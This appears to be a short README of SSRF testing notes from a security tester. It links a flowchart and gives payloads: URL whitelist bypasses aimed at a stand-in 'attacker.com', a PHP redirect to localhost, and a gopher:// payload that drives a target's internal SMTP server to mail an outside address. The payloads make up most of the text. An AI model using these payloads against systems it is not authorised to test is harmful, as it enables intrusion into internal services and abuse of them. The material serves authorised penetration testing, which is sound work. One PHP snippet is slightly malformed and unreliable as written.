# SSRF
## SSRF Methodology Flowchart
Since I've seen so many people ask what to do once they get a request back to their collaborator instance, I created this flowchart to present what I usually do to test and escalate SSRFs. 
<img src=https://github.com/iustin24/SSRF/blob/main/iustinSSRFflowchart.png>
## Sources: 
### Whitelist filter bypasses
Some common whitelist filter bypasses I test against:
```
https://target.com@attacker.com
https://attacker.com/target.com
https://target.com.attacker.com
```
### PHP Redirect
The value appended to location will be the url your page will redirect to. You can also play around with different status codes other than 301, such as 302,303,307.
```
<?php
header("Location: http://127.0.0.1", TRUE, 301);
exit();
?>
```
### SMPT Gopher payloads
Inspired from [d0nut's Piercing the veal](https://medium.com/@d0nut/piercing-the-veal-short-stories-to-read-with-friends-4aa86d606fc5) 
```
<?phpheader("Location: gopher://127.0.0.1:25/_MAIL FROM:test@target.com
RCPT To:attacker@gmail.com
DATA
From:test@target.com
Subject:SMTP Works
Message:
.");?>
```
### Exploiting incosistencies in url parsers
Orange Tsai's blackhat presentation explains this perfectly. ( 
[PDF slides](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf) + 
[Youtube presentation](https://www.youtube.com/watch?v=R9pJ2YCXoJQ&ab_channel=BlackHat) )
